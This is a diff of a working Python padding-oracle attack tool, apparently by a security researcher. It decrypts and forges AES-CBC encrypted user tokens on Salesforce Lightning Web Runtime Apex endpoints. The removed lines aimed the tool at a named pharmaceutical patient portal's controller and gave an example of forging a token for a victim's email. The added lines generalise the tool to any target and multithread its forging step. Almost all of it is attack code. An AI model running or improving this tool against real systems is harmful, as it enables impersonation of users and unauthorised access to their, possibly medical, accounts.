@@ -1,22 +1,19 @@
 #!/usr/bin/env python3
 """
-AES-CBC Padding Oracle Attack — *.my.abbviecare.com
-Exploits differential error responses in Salesforce LWR Apex endpoint.
+AES-CBC Padding Oracle Attack for Salesforce LWR Apex Endpoints
 
-Oracle: MyacConfirmationPageController.checkIfLinkNotExpired
-Vector: POST /s/webruntime/api/apex/execute
+Exploits differential error responses in Salesforce Lightning Web Runtime
+Apex controllers that accept AES-CBC encrypted parameters.
 
-States:
+Oracle states:
   -1  "Input length must be multiple of 16"  (invalid length)
    0  "Given final block not properly padded" (bad padding)
    1  "No content to map to Object" / 200 OK  (valid decryption)
 
-Token: {"userid":"005...","un":"user@email","timestamp":"epoch_ms"}
-
 Usage:
-  python3 aes_cbc_poa.py --test
-  python3 aes_cbc_poa.py --decrypt <base64_token> [--verbose] [--threads 7]
-  python3 aes_cbc_poa.py --forge --userid ID --email EMAIL [--timestamp TS]
+  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --test
+  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --decrypt <token>
+  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --forge --userid ID --email EMAIL
 
 Author: vailsec
 """
@@ -34,9 +31,6 @@ import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 BLOCK_SIZE = 16
-DEFAULT_HOST = "immunology.my.abbviecare.com"
-DEFAULT_CLASS = "MyacConfirmationPageController"
-DEFAULT_METHOD = "checkIfLinkNotExpired"
 MAX_RETRIES = 3
 RETRY_BACKOFF = [1, 2, 4]
 
@@ -255,47 +249,61 @@ def decrypt_token(token_b64, target_url, classname, method,
 
 
 def forge_block(desired_pt, next_ct, target_url, classname, method,
-                block_num, total_blocks, verbose=False):
-    """Find intermediate values via oracle, then XOR with desired plaintext."""
+                block_num, total_blocks, verbose=False, forge_threads=16):
+    """Find intermediate values via oracle with parallel byte guessing."""
     intermediate = bytearray(BLOCK_SIZE)
 
     for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
         padding_value = BLOCK_SIZE - byte_pos
 
-        crafted = bytearray(BLOCK_SIZE)
+        base_crafted = bytearray(BLOCK_SIZE)
         for k in range(byte_pos + 1, BLOCK_SIZE):
-            crafted[k] = intermediate[k] ^ padding_value
+            base_crafted[k] = intermediate[k] ^ padding_value
 
         found = False
-        for guess in range(256):
-            crafted[byte_pos] = guess
-            test_ct = bytes(crafted) + next_ct
-            test_b64 = base64.b64encode(test_ct).decode()
+        found_guess = None
+        stop_event = threading.Event()
 
+        def try_guess(guess):
+            if stop_event.is_set():
+                return None
+            c = bytearray(base_crafted)
+            c[byte_pos] = guess
+            test_b64 = base64.b64encode(bytes(c) + next_ct).decode()
             if oracle(test_b64, target_url, classname, method) == 1:
                 if byte_pos == BLOCK_SIZE - 1:
-                    confirm = bytearray(crafted)
+                    confirm = bytearray(c)
                     confirm[0] ^= 0x01
                     confirm_b64 = base64.b64encode(bytes(confirm) + next_ct).decode()
                     if oracle(confirm_b64, target_url, classname, method) != 1:
-                        continue
+                        return None
+                return guess
+            return None
 
-                intermediate[byte_pos] = guess ^ padding_value
-                byte_num = BLOCK_SIZE - byte_pos
-                log(f"  [Forge {block_num}/{total_blocks}] byte {byte_num:2d}/16: "
-                    f"I=0x{intermediate[byte_pos]:02x}",
-                    verbose_only=True, verbose=verbose)
-                found = True
-                break
+        with ThreadPoolExecutor(max_workers=forge_threads) as pool:
+            futures = {pool.submit(try_guess, g): g for g in range(256)}
+            for future in as_completed(futures):
+                result = future.result()
+                if result is not None and not stop_event.is_set():
+                    stop_event.set()
+                    found_guess = result
+                    found = True
 
-        if not found:
+        if found and found_guess is not None:
+            intermediate[byte_pos] = found_guess ^ padding_value
+            byte_num = BLOCK_SIZE - byte_pos
+            log(f"  [Forge {block_num}/{total_blocks}] byte {byte_num:2d}/16: "
+                f"I=0x{intermediate[byte_pos]:02x}",
+                verbose_only=True, verbose=verbose)
+        else:
             log_err(f"  [!] Forge failed at block {block_num} position {byte_pos}")
             return None
 
     return xor_bytes(bytes(intermediate), desired_pt)
 
 
-def forge_token(userid, email, timestamp, target_url, classname, method, verbose=False):
+def forge_token(userid, email, timestamp, target_url, classname, method,
+                verbose=False, forge_threads=16):
     """Forge AES-CBC token via Vaudenay's encryption-through-oracle attack."""
     token_json = json.dumps(
         {"userid": userid, "un": email, "timestamp": str(timestamp)},
@@ -307,6 +315,7 @@ def forge_token(userid, email, timestamp, target_url, classname, method, verbose
 
     log(f"[*] Payload  : {token_json}")
     log(f"[*] Padded   : {len(padded)} bytes ({n} blocks)")
+    log(f"[*] Threads  : {forge_threads} (per-byte parallel guessing)")
     log(f"[*] Est reqs : ~{128 * n * BLOCK_SIZE} avg")
     log("")
 
@@ -327,7 +336,7 @@ def forge_token(userid, email, timestamp, target_url, classname, method, verbose
 
         forged = forge_block(pt_blocks[i], ct_blocks[i+1],
                             target_url, classname, method,
-                            block_num, n, verbose)
+                            block_num, n, verbose, forge_threads)
         if forged is None:
             log_err("[!] Forge failed. Aborting.")
             sys.exit(1)
@@ -388,27 +397,38 @@ def print_forged(token_b64, token_json, elapsed, count):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="AES-CBC Padding Oracle Attack — *.my.abbviecare.com",
+        description="AES-CBC Padding Oracle Attack for Salesforce LWR Apex Endpoints",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  %(prog)s --test
-  %(prog)s --decrypt <token> --verbose
-  %(prog)s --forge --userid 005J9000000bB8FIAU --email victim@example.com
+  %(prog)s --host example.com --classname Controller --method decryptMethod --test
+  %(prog)s --host example.com --classname Controller --method decryptMethod --decrypt <token>
+  %(prog)s --host example.com --classname Controller --method decryptMethod --forge --userid ID --email user@email.com
         """
     )
 
     mode = parser.add_mutually_exclusive_group(required=True)
     mode.add_argument("--test", action="store_true", help="Test oracle states")
-    mode.add_argument("--decrypt", type=str, metavar="TOKEN", help="Decrypt token")
-    mode.add_argument("--forge", action="store_true", help="Forge new token")
+    mode.add_argument("--decrypt", type=str, metavar="TOKEN", help="Decrypt base64 token")
+    mode.add_argument("--forge", action="store_true", help="Forge new encrypted token")
 
-    parser.add_argument("--userid", type=str, help="Target Salesforce User ID")
-    parser.add_argument("--email", type=str, help="Target email")
-    parser.add_argument("--timestamp", type=str, default=None, help="Epoch ms (default: now)")
-    parser.add_argument("--host", type=str, default=DEFAULT_HOST)
-    parser.add_argument("--threads", type=int, default=7)
-    parser.add_argument("--verbose", action="store_true")
+    parser.add_argument("--host", type=str, required=True,
+                       help="Target hostname (e.g., portal.example.com)")
+    parser.add_argument("--classname", type=str, required=True,
+                       help="Apex controller class name")
+    parser.add_argument("--method", type=str, required=True,
+                       help="Apex method that accepts encryptedParams")
+
+    parser.add_argument("--userid", type=str, help="Target Salesforce User ID (forge mode)")
+    parser.add_argument("--email", type=str, help="Target email address (forge mode)")
+    parser.add_argument("--timestamp", type=str, default=None,
+                       help="Epoch ms for forged token (default: now)")
+    parser.add_argument("--threads", type=int, default=7,
+                       help="Parallel threads for decrypt (default: 7)")
+    parser.add_argument("--forge-threads", type=int, default=16,
+                       help="Parallel guess threads for forge (default: 16)")
+    parser.add_argument("--verbose", action="store_true",
+                       help="Show per-byte progress")
 
     args = parser.parse_args()
 
@@ -421,10 +441,11 @@ Examples:
 
     log(f"\n  AES-CBC Padding Oracle Attack")
     log(f"  Host  : {args.host}")
-    log(f"  Target: {target_url}\n")
+    log(f"  Target: {target_url}")
+    log(f"  Oracle: {args.classname}.{args.method}\n")
 
     if args.test:
-        sys.exit(0 if test_oracle(target_url, DEFAULT_CLASS, DEFAULT_METHOD) else 1)
+        sys.exit(0 if test_oracle(target_url, args.classname, args.method) else 1)
 
     elif args.decrypt:
         try:
@@ -432,13 +453,13 @@ Examples:
         except Exception:
             log_err("[!] Invalid base64"); sys.exit(1)
 
-        if not test_oracle(target_url, DEFAULT_CLASS, DEFAULT_METHOD):
+        if not test_oracle(target_url, args.classname, args.method):
             log_err("[!] Oracle test failed"); sys.exit(1)
         log("")
 
         start = time.time()
-        pt, ok = decrypt_token(args.decrypt, target_url, DEFAULT_CLASS,
-                               DEFAULT_METHOD, args.threads, args.verbose)
+        pt, ok = decrypt_token(args.decrypt, target_url, args.classname,
+                               args.method, args.threads, args.verbose)
         print_decrypted(pt, time.time() - start, _stats.count)
         if not ok:
             sys.exit(1)
@@ -447,20 +468,21 @@ Examples:
         log(f"[*] Forging for: {args.email} ({args.userid})")
         log(f"[*] Timestamp  : {args.timestamp}\n")
 
-        if not test_oracle(target_url, DEFAULT_CLASS, DEFAULT_METHOD):
+        if not test_oracle(target_url, args.classname, args.method):
             log_err("[!] Oracle test failed"); sys.exit(1)
         log("")
 
         start = time.time()
         token_b64, token_json = forge_token(
             args.userid, args.email, args.timestamp,
-            target_url, DEFAULT_CLASS, DEFAULT_METHOD, args.verbose)
+            target_url, args.classname, args.method,
+            args.verbose, args.forge_threads)
         elapsed = time.time() - start
 
         print_forged(token_b64, token_json, elapsed, _stats.count)
 
         log("\n[*] Verifying forged token...")
-        r = oracle(token_b64, target_url, DEFAULT_CLASS, DEFAULT_METHOD)
+        r = oracle(token_b64, target_url, args.classname, args.method)
         log(f"[{'+'if r==1 else '-'}] Verification: {'PASS' if r==1 else 'FAIL'}")
         if r != 1:
             sys.exit(1)
